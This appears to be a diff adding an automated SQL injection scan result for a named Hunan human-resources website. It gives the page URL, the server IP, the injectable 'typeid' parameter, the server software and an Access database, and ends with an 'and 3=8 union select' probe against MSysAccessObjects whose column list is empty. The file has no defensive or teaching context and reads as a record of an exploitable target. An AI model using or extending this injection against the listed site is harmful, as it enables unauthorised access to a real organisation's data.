@@ -1,0 +1,23 @@
+■漏洞信息:============================================================
+ ·URL:http://www.hnrlzysc.com/news/news_list.asp?typeid=44
+ ·页面标题：政策法规,湖南人力资源网
+ ·参数:typeid=44
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:222.240.173.82
+ ·数据库:未知
+ ·HEAD:
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Length: 31216
+Content-Type: text/html
+Server: Microsoft-IIS/7.0
+Date: Fri, 26 Aug 2011 07:17:09 GMT
+Connection: close
+
+
+ ·数据库:Access
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
